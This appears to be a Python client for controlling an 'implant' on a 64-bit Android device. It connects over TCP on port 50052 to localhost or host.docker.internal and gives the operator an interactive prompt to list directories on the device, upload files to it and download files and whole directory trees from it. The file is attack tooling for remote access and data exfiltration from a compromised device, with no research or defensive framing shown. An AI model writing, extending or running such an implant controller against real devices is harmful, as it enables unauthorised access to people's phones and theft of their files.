import socket
import sys
import os

def is_running_in_docker():
    """Detect if running inside Docker container"""
    if os.path.exists('/.dockerenv'):
        return True
    try:
        with open('/proc/1/cgroup', 'r') as f:
            return 'docker' in f.read()
    except:
        return False

def normalize_local_path(path):
    """Normalize local path for Docker environment"""
    if is_running_in_docker():
        # In Docker, convert relative paths to /workspace paths
        if path.startswith('./'):
            path = '/workspace/' + path[2:]
        elif path.startswith('.'):
            path = '/workspace/' + path[1:]
        elif not path.startswith('/'):
            path = '/workspace/' + path
    return path

def copy_directory(sock, remote_dir, local_dir, direction):
    """Recursively copy directory"""
    import os
    # Normalize path for Docker
    local_dir = normalize_local_path(local_dir)
    os.makedirs(local_dir, exist_ok=True)
    
    # Get directory listing
    sock.sendall(f"ls {remote_dir}\n".encode())
    response = b""
    while True:
        data = sock.recv(1024)
        if not data:
            break
        response += data
        if b'\x00' in response:
            break
    content = response.decode().rstrip('\x00')
    
    if "Error" in content:
        print(f"Cannot list directory {remote_dir}: {content}")
        return
    
    items = content.split('\n')
    
    for item in items:
        item = item.strip()
        if not item or item in ['.', '..']:
            continue
        
        remote_path = f"{remote_dir}/{item}"
        local_path = f"{local_dir}/{item}"
        
        # Try to copy as file first
        print(f"Trying to copy {remote_path}...")
        sock.sendall(f"cp {remote_path} {local_path} {direction}\n".encode())
        if direction == "download":
            try:
                size_data = sock.recv(8)  # off_t is 8 bytes on 64-bit Android
                size = int.from_bytes(size_data, byteorder='little')
                print(f"Size for {remote_path}: {size}")
                if size > 0:
                    data = b""
                    while len(data) < size:
                        chunk = sock.recv(min(1024, size - len(data)))
                        if not chunk:
                            break
                        data += chunk
                    with open(local_path, 'wb') as f:
                        f.write(data)
                    print(f"Copied file {remote_path} to {local_path}")
                elif size == 0:
                    # It's a directory, copy recursively
                    print(f"{remote_path} is a directory, recursing...")
                    copy_directory(sock, remote_path, local_path, direction)
                else:
                    print(f"Skipping {remote_path} (negative size)")
            except Exception as e:
                print(f"Error copying {remote_path}: {e}")

def main():
    # Auto-detect if running in Docker and use appropriate host
    if is_running_in_docker():
        host = 'host.docker.internal'
        print("🐳 Running in Docker - connecting to host.docker.internal")
    else:
        host = 'localhost'
    
    port = 50052

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        sock.settimeout(10)  # Add timeout to prevent hanging
        print("Connected to implant. Type commands: ls [path], cd <path>, cp <src> <dst> <upload|download>, exit")
        
        while True:
            cmd = input("> ").strip()
            if not cmd:
                continue
            if cmd == "exit":
                break
            parts = cmd.split()
            command = parts[0]
            
            if command == "ls":
                path = "." if len(parts) == 1 else parts[1]
                if path == ".":
                    path = "/"  # Default to root directory
                sock.sendall(f"ls {path}\n".encode())
                response = b""
                while True:
                    data = sock.recv(1024)
                    if not data:
                        break
                    response += data
                    if b'\x00' in response:
                        break
                print(response.decode().rstrip('\x00'))
            
            elif command == "cd":
                if len(parts) < 2:
                    print("Usage: cd <path>")
                    continue
                path = parts[1]
                sock.sendall(f"cd {path}\n".encode())
                response = b""
                while True:
                    data = sock.recv(1024)
                    if not data:
                        break
                    response += data
                    if b'\x00' in response:
                        break
                print(response.decode().rstrip('\x00'))
            
            elif command == "cp":
                if len(parts) < 4:
                    print("Usage: cp <src> <dst> <upload|download>")
                    continue
                src = parts[1]
                dst = parts[2]
                direction = parts[3]
                
                # Normalize local path for Docker
                if direction == "download":
                    dst = normalize_local_path(dst)
                elif direction == "upload":
                    src = normalize_local_path(src)
                
                if direction not in ["upload", "download"]:
                    print("Direction must be 'upload' or 'download'")
                    continue
                
                # Try as a file first
                sock.sendall(f"cp {src} {dst} {direction}\n".encode())
                if direction == "upload":
                    # Send file to implant
                    try:
                        with open(src, 'rb') as f:
                            data = f.read()
                            size = len(data)
                            sock.sendall(size.to_bytes(4, byteorder='little'))
                            sock.sendall(data)
                            response = sock.recv(1024).decode().strip()
                            print(response)
                    except Exception as e:
                        print(f"Error uploading file: {e}")
                elif direction == "download":
                    # Receive file from implant
                    try:
                        size_data = sock.recv(8)  # off_t is 8 bytes on 64-bit Android
                        size = int.from_bytes(size_data, byteorder='little')
                        if size > 0:
                            data = b""
                            while len(data) < size:
                                chunk = sock.recv(min(1024, size - len(data)))
                                if not chunk:
                                    break
                                data += chunk
                            with open(dst, 'wb') as f:
                                f.write(data)
                            print(f"Downloaded file {size} bytes to {dst}")
                        else:
                            # Possibly a directory, try to copy all files from it
                            print(f"{src} appears to be a directory, copying all files from it...")
                            copy_directory(sock, src, dst, direction)
                    except Exception as e:
                        print(f"Error downloading: {e}")
            
            else:
                print("Unknown command")
        
        sock.close()
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()